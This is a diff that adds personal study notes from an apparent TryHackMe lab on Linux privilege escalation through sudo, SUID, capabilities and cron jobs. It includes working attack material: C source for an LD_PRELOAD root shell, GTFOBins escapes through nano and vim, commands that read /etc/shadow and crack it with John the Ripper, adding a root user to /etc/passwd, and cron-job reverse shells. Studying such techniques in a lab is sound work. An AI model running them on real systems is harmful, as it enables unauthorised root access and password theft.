@@ -262,3 +262,221 @@ Although it looks simple, please remember that a failed kernel exploit can lead 
 	- `./pwned`
 
 # Privilege Escalation: Sudo
+The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.
+
+Any user can check its current situation related to root privileges using the `sudo -l` command.
+
+[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+## Leverage application functions
+
+Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
+
+In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).
+
+![](./img/Pasted%20image%2020230905163359.png)
+
+Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.
+
+## Leverage LD_PRELOAD
+
+On some systems, you may see the LD_PRELOAD environment option.
+
+![](./img/Pasted%20image%2020230905163427.png)
+
+LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  
+
+The steps of this privilege escalation vector can be summarized as follows;
+
+1. Check for LD_PRELOAD (with the env_keep option)
+2. Write a simple C code compiled as a share object (.so extension) file
+3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+The C code will simply spawn a root shell and can be written as follows;
+
+
+```
+#include <stdio.h>  
+#include <sys/types.h>  
+#include <stdlib.h>  
+  
+void _init() {  
+unsetenv("LD_PRELOAD");  
+setgid(0);  
+setuid(0);  
+system("/bin/bash");  
+}  
+```
+
+We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
+
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+![](./img/Pasted%20image%2020230905163505.png)
+
+We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
+
+We need to run the program by specifying the LD_PRELOAD option, as follows;
+
+`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
+
+This will result in a shell spawn with root privileges.
+
+![](./img/Pasted%20image%2020230905163523.png)
+
+To get the hash of another user when we do not have root access:
+- Check it here: https://gtfobins.github.io/gtfobins/nano/
+```shell
+cd / 
+sudo nano
+# Press CTRL+R CTRL+X, and then type the following:
+reset; bash 1>&0 2>&0
+# Press ENTER
+```
+- Now you got a root shell on nano and can check everything
+
+# Privilege Escalation: SUID
+
+Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
+  
+You will notice these files have an “s” bit set showing their special permission level.  
+  
+`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
+
+![](./img/Pasted%20image%2020230905165321.png)
+
+A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).
+
+The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
+
+![](./img/Pasted%20image%2020230905165346.png)
+
+The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
+  
+Below are simple steps using both vectors.  
+  
+reading the `/etc/shadow` file  
+  
+We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.  
+  
+`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.
+
+![](./img/Pasted%20image%2020230905165405.png)
+
+The unshadow tool’s usage can be seen below; `unshadow passwd.txt shadow.txt > passwords.txt`
+
+![](./img/Pasted%20image%2020230905165435.png)
+
+With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripper0](https://tryhackme.com/room/johntheripper0)
+
+The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:
+
+We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
+
+![](./img/Pasted%20image%2020230905165502.png)
+
+We will then add this password with a username to the `/etc/passwd` file.
+
+![](./img/Pasted%20image%2020230905165519.png)
+
+Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.
+
+![](./img/Pasted%20image%2020230905165535.png)
+
+- To find the password I did:
+	- Find this: https://gtfobins.github.io/gtfobins/base64/
+	- Create a folder suid on my local machine with 3 files: `passwd.txt`, `shadow.txt` and `passwords.txt`
+	- I copy the `/etc/passwd` file of the victim's machine on my `passwd.txt` file, but changing the latest ones (users ones) by its `/etc/shadow` file
+		- Obtain the content of the `/etc/shadow` file using: `base64 /etc/shadow | base64 --decode`
+	- I copy the `/etc/shadow` file of the victim's machine on my `shadow.txt` file
+	- I do this: `unshadow passwd.txt shadow.txt > passwords.txt`
+	- The I use John The Ripper to crack passwords: `john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
+- To find the flag I did: `base64 /home/ubuntu/flag3.txt` | base64 --decode
+
+# Privilege Escalation: Capabilities
+
+Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
+The capabilities man page provides detailed information on its usage and options.  
+  
+We can use the `getcap` tool to list enabled capabilities.
+
+![](./img/Pasted%20image%2020230905172607.png)
+
+When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.  
+  
+Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
+
+![](./img/Pasted%20image%2020230905172624.png)
+
+GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
+  
+We notice that vim can be used with the following command and payload:
+
+![](./img/Pasted%20image%2020230905172641.png)
+
+This will launch a root shell as seen below;
+
+![](./img/Pasted%20image%2020230905172658.png)
+
+- To elevate privileges I found:
+	- https://gtfobins.github.io/gtfobins/vim/#capabilities
+	- The I put this command to get a shell: `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset;`
+
+# Privilege Escalation: Cron Jobs
+
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  
+  
+Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.  
+  
+Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.  
+  
+Any user can read the file keeping system-wide cron jobs under `/etc/crontab`  
+  
+While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
+
+![](./img/Pasted%20image%2020230905174142.png)
+
+You can see the `backup.sh` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.
+
+![](./img/Pasted%20image%2020230905174203.png)
+
+As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.  
+  
+The script will use the tools available on the target system to launch a reverse shell.  
+Two points to note;
+
+1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
+2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
+
+The file should look like this;
+
+![](./img/Pasted%20image%2020230905174226.png)
+
+We will now run a listener on our attacking machine to receive the incoming connection.
+
+![](./img/Pasted%20image%2020230905174243.png)
+
+Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
+
+1. System administrators need to run a script at regular intervals.
+2. They create a cron job to do this
+3. After a while, the script becomes useless, and they delete it  
+4. They do not clean the relevant cron job
+
+This change management issue leads to a potential exploit leveraging cron jobs.
+
+![](./img/Pasted%20image%2020230905174305.png)
+
+The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.  
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.  
+
+The file on the target system should look familiar:
+
+![](./img/Pasted%20image%2020230905174337.png)
+
+The incoming reverse shell connection has root privileges:
+
+![](./img/Pasted%20image%2020230905174353.png)
+
+
